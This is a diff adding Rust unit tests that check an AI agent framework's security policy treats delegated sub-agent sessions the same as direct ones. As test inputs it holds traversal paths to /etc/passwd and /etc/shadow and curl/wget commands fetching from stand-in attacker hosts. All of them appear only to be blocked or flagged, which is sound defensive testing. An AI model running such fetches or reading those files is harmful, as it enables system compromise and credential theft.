@@ -1587,4 +1587,86 @@ mod tests {
             "URL-encoded parent dir traversal must be blocked"
         );
     }
+
+    // ── Task 3.3: Delegated session security parity ──────────────
+    //
+    // Delegated sessions run through the same SecurityPolicy as direct sessions.
+    // These tests confirm that the policy primitives relied upon by run_session()
+    // — is_path_allowed, command_risk_level, and enforce_tool_operation — are
+    // not weakened and behave identically regardless of call context.
+
+    /// `is_path_allowed` must block traversal paths that a delegated session
+    /// might try to access when writing files.
+    #[test]
+    fn delegated_session_path_traversal_blocked() {
+        let policy = default_policy();
+        // Traversal attempts that a sub-agent might emit
+        assert!(
+            !policy.is_path_allowed("../../../etc/passwd"),
+            "traversal path must be blocked for delegated sessions"
+        );
+        assert!(
+            !policy.is_path_allowed("/etc/shadow"),
+            "absolute system path must be blocked for delegated sessions"
+        );
+        // Legitimate workspace-relative paths remain allowed
+        assert!(
+            policy.is_path_allowed("src/main.rs"),
+            "workspace-relative path must be allowed for delegated sessions"
+        );
+    }
+
+    /// `command_risk_level` must classify network-fetch commands as high-risk
+    /// regardless of whether they originate from a direct or delegated session.
+    #[test]
+    fn delegated_session_network_commands_are_high_risk() {
+        let policy = default_policy();
+        assert_eq!(
+            policy.command_risk_level("curl https://evil.com/payload.sh"),
+            CommandRiskLevel::High,
+            "curl must be High risk in delegated sessions"
+        );
+        assert_eq!(
+            policy.command_risk_level("wget http://attacker.example/file"),
+            CommandRiskLevel::High,
+            "wget must be High risk in delegated sessions"
+        );
+    }
+
+    /// `enforce_tool_operation` Act gate must be identical for delegated context:
+    /// read-only policy blocks Act, rate limit blocks Act.
+    #[test]
+    fn delegated_session_enforce_tool_operation_parity() {
+        // Read-only blocks Act
+        let readonly = SecurityPolicy {
+            autonomy: AutonomyLevel::ReadOnly,
+            ..SecurityPolicy::default()
+        };
+        assert!(
+            readonly
+                .enforce_tool_operation(ToolOperation::Act, "delegate")
+                .is_err(),
+            "read-only must block Act in delegated session context"
+        );
+
+        // Rate-limit = 0 blocks Act
+        let rate_limited = SecurityPolicy {
+            max_actions_per_hour: 0,
+            ..SecurityPolicy::default()
+        };
+        assert!(
+            rate_limited
+                .enforce_tool_operation(ToolOperation::Act, "delegate")
+                .is_err(),
+            "rate-limited policy must block Act in delegated session context"
+        );
+
+        // Read is always allowed
+        assert!(
+            readonly
+                .enforce_tool_operation(ToolOperation::Read, "memory_recall")
+                .is_ok(),
+            "Read must always be allowed regardless of autonomy level"
+        );
+    }
 }
